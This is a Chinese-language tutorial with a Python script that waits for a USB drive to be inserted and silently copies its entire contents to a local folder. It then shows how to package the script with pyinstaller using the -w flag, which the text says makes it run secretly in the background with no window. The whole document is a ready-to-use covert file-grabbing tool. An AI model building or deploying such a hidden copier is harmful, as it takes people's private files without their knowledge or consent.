Python
<a name="HO1CE"></a>
## 代码
```python
# -*- coding:utf-8 -*-
import os
import time
from datetime import datetime
import shutil

# U盘的盘符
usb_path = "E:/"
# 要复制到的路径
save_path = "D:/haha"

while (True):
    if os.path.exists(usb_path):
        shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
        break
    else:
        time.sleep(10)
```
上面就是所有的代码，代码有两个地方要改成自己的路径，在代码里注释了

- `usb_path`就是U盘的盘符，比如电脑有C,D盘，那么U盘插上来以后路径就是E盘
- `save_path`就是你要把复制的文件保存在哪里
<a name="vJ3tL"></a>
## Python文件打包成exe
<a name="B5spp"></a>
### 1. 在命令行用pip安装 pyinstaller包
```bash
pip install pyinstaller
```
<a name="zpynH"></a>
### 2.下载安装pyinstaler运行时所需要的windows扩展pywin32
```bash
mhammond/pywin32
```
选择最新版的下载，注意要选择对应的Python版本(version)和python位数(bittedness)<br />通过在命令行输入Python查看Python版本和位数<br />如下所示为Python3.6的32位，需要下载`[pywin32-223.win32-py3.6.exe]`
```bash
Python 3.6.3 ... [MSC v.1900 32 bit (Intel)] on win32
```
如下所示为Python3.6的64位，需要下载`[pywin32-223.win-amd64-py3.6.exe]`
```bash
Python 3.6.3 ... [MSC v.1900 64 bit (AMD64)] on win32
```
<a name="NTNxk"></a>
### 3.在命令行中直接输入下面的指令即可
```bash
pyinstaller [opts] yourprogram.py 
```
<a name="UYOA9"></a>
#### 参数含义
`-F`    指定打包后只生成一个exe格式的文件(建议写上这个参数)<br />`-D`    `–onedir` 创建一个目录，包含exe文件，但会依赖很多文件（默认选项）<br />`-c`    `–console`, `–nowindowed` 使用控制台，无界面(默认)<br />`-w`    `–windowed`, `–noconsole` 使用窗口，无控制台<br />`-p`    添加搜索路径，让其找到对应的库。<br />`-i`    改变生成程序的icon图标(换个好看的图标，默认的很丑)
<a name="UYgYW"></a>
#### 实例说明
比如有个Python程序叫test.py，绝对路径在[D:\project]，打包成一个exe格式的文件
```bash
pyinstaller -F D:\project\test.py
```
条件同上，如果还希望没有控制台的终端显示，在进程中偷偷运行
```bash
pyinstaller -F -w D:\project\test.py
```
条件同上，如果还希望更换程序图标
```bash
pyinstaller -F -w -i D:\project\test.ico D:\project\test.py
```
<a name="CCROi"></a>
## 运行程序
最后双击打开生成的exe文件，看不到界面，但是可以在任务管理器的后台进程中找到，当有U盘插入，就会自动复制到设定的地址，然后进程就会自动关闭。
